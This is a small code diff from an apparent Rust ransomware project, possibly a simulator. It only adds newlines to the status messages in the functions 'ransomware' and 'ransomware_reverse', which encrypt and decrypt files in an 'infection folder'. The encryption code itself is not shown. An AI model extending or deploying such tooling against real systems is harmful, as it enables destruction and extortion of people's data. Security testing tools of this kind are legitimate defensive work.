@@ -191,7 +191,7 @@ pub fn ransomware(silent_mode: &bool) {
     }
     if !silent_mode {
         println!("🔍 Infection folder found");
-        println!("🔑 Encrypting files in the infection folder");
+        println!("🔑 Encrypting files in the infection folder\n");
     }
     encrypt_files(silent_mode);
 }
@@ -291,7 +291,7 @@ pub fn ransomware_reverse(key: &str, silent_mode: &bool) {
     }
     if !silent_mode {
         println!("🔍 Infection folder found");
-        println!("🔑 Decrypting files in the infection folder");
+        println!("🔑 Decrypting files in the infection folder\n");
     }
     decrypt_files(key, silent_mode);
 }
